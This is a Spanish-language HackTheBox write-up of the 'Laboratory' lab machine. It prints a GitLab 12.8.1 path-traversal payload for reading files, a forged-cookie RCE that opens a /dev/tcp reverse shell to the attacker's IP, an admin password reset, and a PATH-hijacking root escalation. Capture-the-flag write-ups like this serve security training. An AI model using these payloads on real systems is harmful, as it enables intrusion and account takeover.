---
title: "Laboratory Write-UP | HackTheBox"
date: "2021-04-28"
categories: [Write-Ups, HackTheBox]
tags: [CTFs, HackTheBox, Write-Ups]
media_subpath: /assets/img/posts/2021-04-28-laboratory-write-up-hackthebox
image:
   path: header/laboratory_card.webp
   lqip: data:image/webp;base64,UklGRmgAAABXRUJQVlA4IFwAAADwAwCdASoUAAsAPzmEuVOvKKWisAgB4CcJYwAAWyC6Kj2Y0EIHQDwAAP6JMCOz0ijVvm3RyYMY/t4xvbZ+vM4xSjy4gRArP7sSAwS6EuuSNuuP/UXIyQ1tHBgIAA==
   
published: true
---

## Descripción

En esta máquina Laboratory de la plataforma **Hackthebox** con dificultad "Easy" y OS Linux, haremos uso de vulnerabilidades conocidas reportadas en la plataforma HackerOne para el servicio web Gitlab. Escaparemos del contenedor donde se encuentra el servicio web y realizaremos path hijacking para escalar privilegios a través de un binario con permisos SUID

Como punto a comentar, la dirección IP de la máquina activa y la que se muestran en las imágenes y/o comandos utilizados son diferentes, ya que se ha utilizado instancia personal para la realización de dicho laboratorio.

## Escaneo y Enumeración

Comenzaremos como siempre con una traza ICMP para descubrir el tipo de SO que utiliza la máquina objetivo en base al **TTL**.

Nos encontramos con una máquina de SO GNU/Linux:

```bash
$ ping -c 1 10.129.137.51

PING 10.129.137.51 (10.129.137.51) 56(84) bytes of data.
64 bytes from 10.129.137.51: icmp_seq=1 ttl=63 time=48.1 ms

--- 10.129.137.51 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 48.128/48.128/48.128/0.000 ms
```

Hacemos uso de la herramienta **NMAP** para descubrir puertos abiertos:

```bash
# Nmap 7.91 scan initiated Tue Apr 27 13:16:03 2021 as: nmap -sS --min-rate 5000 -p- --open -n -Pn -v -oG allPorts -oN laboratory.initScan 10.129.137.51
Nmap scan report for 10.129.137.51
Host is up (0.048s latency).
Not shown: 65532 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

Observamos que tiene 3 puertos abiertos corriendo los servicios: **SSH(22), 80(HTTP) y 443(HTTPS)**.

Lanzamos nuevamente NMAP para intentar descubrir vulnerabilidades conocidas y versión utilizada por los servicios corriendo en los puertos abiertos:

```bash
# Nmap 7.91 scan initiated Tue Apr 27 13:20:34 2021 as: nmap -sC -sV -n -Pn -p22,80,443 -oN laboratory.targeted 10.129.137.51
Nmap scan report for 10.129.137.51
Host is up (0.049s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)
|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)
|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to <https://laboratory.htb/>
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
| tls-alpn: 
|_  http/1.1
Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos que se está aplicando Virtualhosting con dominio **laboratory.htb** y hemos encontrado un posible sub-dominio **git.laboratory.htb**

Añadimos el dominio y subdominio que nos ha mostrado el resultado de nmap en el archivo hosts de nuestra máquina local, de esta forma podemos resolver correctamente a nivel de virtual-host:

```bash
$ echo -e "10.129.137.51\\tlaboratory.htb git.laboratory.htb" >> /etc/hosts

$ cat /etc/hosts

127.0.0.1       localhost
127.0.1.1       parrot
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

# HackTheBox Machines
10.129.137.51   laboratory.htb git.laboratory.htb
```

Lanzamos script **http-enum** de nmap para fuzzer de forma rápida los puertos **80** y **443** que son los que están corriendo con servicio web:

```bash
# Nmap 7.91 scan initiated Tue Apr 27 13:32:36 2021 as: nmap --script http-enum -p80,443 -oN laboratory.webScan laboratory.htb
Nmap scan report for laboratory.htb (10.129.137.51)
Host is up (0.048s latency).

PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https
| http-enum: 
|_  /body/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
```

Vemos que no nos muestra mucha información, únicamente un directorio a través del puerto **443/HTTPS** con nombre **body**

Probamos otra vez el fuzzer de nmap pero ahora al subdominio obtenido con nmap (git.laboratory.htb):

```bash
# Nmap 7.91 scan initiated Tue Apr 27 13:34:10 2021 as: nmap --script http-enum -p80,443 -oN laboratory.subScan git.laboratory.htb
Nmap scan report for git.laboratory.htb (10.129.137.51)
Host is up (0.047s latency).
rDNS record for 10.129.137.51: laboratory.htb

PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https
| http-enum: 
|_  /robots.txt: Robots file
```

Únicamente un archivo **robots.txt**, igual nos puede mostrar rutas interesantes.

Utilizamos la herramienta **whatweb** para identificar de una pasada el sitio web, tanto el dominio principal como el subdominio:

```bash
$ whatweb <http://laboratory.htb>

<http://laboratory.htb> [302 Found] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.137.51], RedirectLocation[<https://laboratory.htb/>], Title[302 Found]
<https://laboratory.htb/> [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.137.51], JQuery, Script, Title[The Laboratory]
```

Vemos que nos hace redirect inmediatamente al puerto 443/HTTPS

```bash
$ whatweb <https://git.laboratory.htb>

<https://git.laboratory.htb> [302 Found] Cookies[experimentation_subject_id], Country[RESERVED][ZZ], HTTPServer[nginx], HttpOnly[experimentation_subject_id], IP[10.129.137.51], RedirectLocation[<http://git.laboratory.htb/users/sign_in>], Strict-Transport-Security[max-age=31536000], UncommonHeaders[referrer-policy,x-content-type-options,x-download-options,x-permitted-cross-domain-policies,x-request-id], X-Frame-Options[DENY], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block], nginx
<http://git.laboratory.htb/users/sign_in> [302 Found] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.137.51], RedirectLocation[<https://git.laboratory.htb/users/sign_in>], Title[302 Found]
<https://git.laboratory.htb/users/sign_in> [200 OK] Cookies[_gitlab_session,experimentation_subject_id], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], HttpOnly[_gitlab_session,experimentation_subject_id], IP[10.129.137.51], Open-Graph-Protocol, PasswordField[new_user[password],user[password]], Script, Strict-Transport-Security[max-age=31536000], Title[Sign in · GitLab], UncommonHeaders[referrer-policy,x-content-type-options,x-download-options,x-permitted-cross-domain-policies,x-request-id], X-Frame-Options[DENY], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block], nginx
```

Nos encontramos con la plataforma de **Gitlab.**

Accedemos al dominio principal a través de navegador y no encontramos gran cosa, únicamente 3 posibles usuarios (**Dexter**, **Dee Dee** y **Anonymous**):

![](body/3ce6c6033c92492ae7ad67e910703411870fefb0.png)

Ahora pasamos a acceder al subdominio que contiene la plataforma Gitlab alojada en la máquina y nos encontramos que tiene un panel de **Login** y otro de **Register**.

Nos registramos y accedemos al panel de usuario:

![](body/c9a7f66bf1e1284cfe3528bbea9c52ba71c8c982.png)

Podemos explorar proyectos de otros usuarios, como por ejemplo el del usuario Dexter, pero no nos muestra información relevante:

![](body/2e861cbe4c1aae6707393767aad1305fb713b5be.png)

## Explotación

Encontramos la versión de Gitlab en la zona de ayuda "help" y nos indica que se trata de la versión **Gitlab Comunity Edition 12.8.1**. Si realizamos una búsqueda rápida en google como "**Gitlab 12.8.1 exploit**", llegaremos a un report del sitio web **HackerOne** donse se reportaron varias vulnerabilidades para esta versión:

![](body/0e3e5f792b3f166758bbc04d2ec0d92001f41324.png)

> **_Enlace Reporte Vulnerabilidades HackerOne_**
> 
> [https://hackerone.com/reports/827052](https://hackerone.com/reports/827052)

Una de estas vulnerabilidades se trata de "**Arbitrary File Read**", la cual nos permite leer archivos del servidor:

1.- Creamos 2 proyectos

2.- En uno de los proyectos creamos un issue con el siguiente contenido en el description box:

```bash
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
```

3.- Una vez creado, movemos el issue al otro proyecto.

4.- El archivo adjunto que contiene el issue ahora lo podemos descargar y visualizar.

5.- Podemos enumerar los usuarios a nivel de sistema del archivo **passwd** obtenido:

```bash
$ grep 'sh$' passwd

 root:x:0:0:root:/root:/bin/bash
 git:x:998:998::/var/opt/gitlab:/bin/sh
 gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
 mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
 registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
 gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
 gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
```

La siguiente vulnerabilidad se trata de **RCE**, podemos ejecutar comandos en la máquina si obtenemos el valor de la variable **secret\_key\_base** que se encuentra en la ruta **/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml** y la inyectamos en nuestro propio archivo **secrets.yml**, creando una cookie modificada con **rails console** para Gitlab:

![](body/4f045f8e50ada42b6ca64cabbef0045cd819c7a3.png)

Para ello tendremos que obtener el archivo **secrets.yml** con el paso anterior e instalar Gitlab en nuestra máquina:

Obtenemos el archivo secrets.yml como anteriormente hemos obtenido passwd:

```bash
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../..**/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)
```

1.- Descargamos el paquete **deb**:

```bash
$ wget --content-disposition https://packages.gitlab.com/gitlab/gitlab-ce/packages/debian/buster/gitlab-ce_12.8.1-ce.0_amd64.deb/download.deb $ dpkg -i gitlab-ce_12.8.1-ce.0_amd64.deb (Una vez instalado) $ gitlab-ctl reconfigure $ gitlab-ctl restart
```

2.- Añadimos el valor de la variable obtenida en nuestro archivo **secrets.yml**

3.- Ejecutamos **gitlab-rails console** y establecemos la shell inversa:

```bash
$ gitlab-rails console
 request = ActionDispatch::Request.new(Rails.application.env_config)
 request.env["action_dispatch.cookies_serializer"] = :marshal
 cookies = request.cookie_jar
 erb = ERB.new("<%= bash -c \'bash -i >& /dev/tcp/10.10.14.38/443 0>&1\' %>")
 depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
 cookies.signed[:cookie] = depr
 puts cookies[:cookie]
```

4.- Ponemos netcat a la escucha en el puerto que hayamos especificado anteriormente y ejecutamos curl con la cookie que nos ha proporcinado gitlab-rails console y añadimos la el parámetro **\-k** para que el certificado no sea validado:

```bash
curl -s -k 'https://git.laboratory.htb/users/sign_in' -b 'experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjM4LzQ0MyAwPiYxJ2AgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--baa3ab16ca98b58a8a7bddcbab31de5bd380095a'
```

5.- Obtenemos shell:

![](body/344f491b2efeb03269a48b980baabd28f12ef539.png)

6.- Realizamos tratamiento para obtener shell interactiva:

```bash
git@git:~/gitlab-rails/working$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null

Control + Z
ssty raw -echo; fg
reset
xterm

git@git:~/gitlab-rails/working$ export SHELL=bash
git@git:~/gitlab-rails/working$ export TERM=xterm-256color
git@git:~/gitlab-rails/working$ stty rows 70 columns 253
```

## Movimiento lateral

Comprobamos el segmento de red en el que nos encontramos y vemos que estamos dentro de un contenedor:

```bash
git@git:~/gitlab-rails/working$ cat /proc/net/fib_trie
Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.17.0.0/16 2 0 2
        +-- 172.17.0.0/30 2 0 2
           |-- 172.17.0.0
              /32 link BROADCAST
              /16 link UNICAST
           |-- 172.17.0.2
              /32 host LOCAL
        |-- 172.17.255.255
           /32 link BROADCAST
Local:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.17.0.0/16 2 0 2
        +-- 172.17.0.0/30 2 0 2
           |-- 172.17.0.0
              /32 link BROADCAST
              /16 link UNICAST
           |-- 172.17.0.2
              /32 host LOCAL
        |-- 172.17.255.255
           /32 link BROADCAST
```

Enumerando el contenedor, comprobamos que tenemos acceso a la consola **gitlab-rails** y siendo usuario **Git**, podemos ejecutar comando privilegiados para la plataforma: **Gitlab**.

Enumeramos los usuarios de la plataforma Gitlab, nos interesan los usuarios que sean administradores:

```bash
git@git:/opt/gitlab/bin$ gitlab-rails console
--------------------------------------------------------------------------------
 GitLab:       12.8.1 (d18b43a5f5a) FOSS
 GitLab Shell: 11.0.0
 PostgreSQL:   10.12
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.2)
irb(main):001:0> user = User.where(admin: true)
=> #<ActiveRecord::Relation [#<User id:1 @dexter>]>
```

Nos devuelve que el usuario **Dexter** es administrador de la plataforma.

Cambiamos la contraseña del usuario **Dexter:**

```bash
irb(main):002:0> user = User.find(1)
=> <User id:1 @dexter>
irb(main):003:0> user.password = 'admin123!'
=> "admin123!"
irb(main):004:0> user.password_confirmation = 'admin123!'
=> "admin123!"
irb(main):005:0> user.save
Enqueued ActionMailer::DeliveryJob (Job ID: b9d146a4-b11f-4218-a486-88c794764e7b) to Sidekiq(mailers) with arguments: "DeviseMailer", "password_change", "deliver_now", #<GlobalID:0x00007f3aa3afe530 @uri=#<URI::GID gid://gitlab/User/1>>
=> true
```

Accedemos con el usuario y la contraseña que hemos establecido en la plataforma de Gitlab a través del navegador y comprobamos como el usuario Dexter tiene un proyecto privado (**SecureDocker**):

![](body/0f767f2ec194e662a61ac99581bdbbad9de7aab7.png)

Enumerando el proyecto, llegamos a al directorio .**ssh**, donde encontramos la clave id\_rsa de este usuario. Copiamos la clave y la guardamos en nuestra máquina local asignándole permisos 600:

![](body/423280530dd71ff1109b96d189f768bb6f79eebe.png)

Accedemos por ssh con el usuario Dexter y la clave **id\_rsa** que hemos obtenido:

![](body/855f396da6ec35d185f578eb455d62182f0e94bf.png)

### User Flag

Visualizamos la flag en el directorio home del usuario Dexter:

```bash
dexter@laboratory:~$ wc -c user.txt 
33 user.txt
```

## Escalada de privilegios

Enumeramos el sistema para encontrar archivos interesantes y llegamos a un binario con **SUID** habilitado (**docker-security**):

```bash
dexter@laboratory:~$ find / -perm -4000 2>/dev/null | grep -v 'snap'

/usr/local/bin/docker-security

(...)
```

Comprobamos que efectivamente se trata de un binario con **SUID**:

![](body/50b1f1898329bd334ffdb160c44441f1c0cdbdf9.png)

Ejecutamos **ltrace** para comprobar las librerias compartidas que utiliza y vemos que realiza llamadas al binario **chmod** con rula relativa, si amigos si...toca PATH HIJACKING!

```bash
dexter@laboratory:/usr/local/bin$ ltrace docker-security 
setuid(0)                                                                                                                                                    = -1
setgid(0)                                                                                                                                                    = -1
system("chmod 700 /usr/bin/docker"chmod: changing permissions of '/usr/bin/docker': Operation not permitted
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                                       = 256
system("chmod 660 /var/run/docker.sock"chmod: changing permissions of '/var/run/docker.sock': Operation not permitted
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                                       = 256
+++ exited (status 0) +++
```

Nos movemos al directorio **/dev/shm** (por qué no?) y creamos el archivo chmod asignando permisos de ejecución:

```bash
dexter@laboratory:~$ cd /dev/shm
dexter@laboratory:/dev/shm$ touch chmod && chmod +x chmod
dexter@laboratory:/dev/shm$ echo -e '#!/usr/bin/env bash\\n/usr/bin/chmod 4755 /bin/bash' > chmod
```

Exportamos la variable $**PATH** añadiendo el directorio actual **/dev/shm**. Aquí lo podemos realizar de 2 maneras, o estableciendo el punto "." que determina que es el directorio actual o introduciendo la ruta completa del directorio donde nos encontramos, yo lo voy a realizar con el punto ya que es más rápido:

```bash
dexter@laboratory:/dev/shm$ export PATH=.:$PATH
dexter@laboratory:/dev/shm$ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
```

Ejecutamos el binario **/usr/local/bin/docker-security** y vemos como se ha añadido el permido SUID al binario de bash. Solo nos queda ejecutar bash con el contexto de usuario privilegiado **\-p**:

```bash
dexter@laboratory:/dev/shm$ /usr/local/bin/docker-security 
dexter@laboratory:/dev/shm$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
dexter@laboratory:/dev/shm$ bash -p
bash-5.0# whoami
root
bash-5.0# id
uid=1000(dexter) gid=1000(dexter) euid=0(root) groups=1000(dexter)
```

### Root Flag

Visualizamos la flag de root:

```bash
bash-5.0# wc -c root.txt 
33 root.txt
```
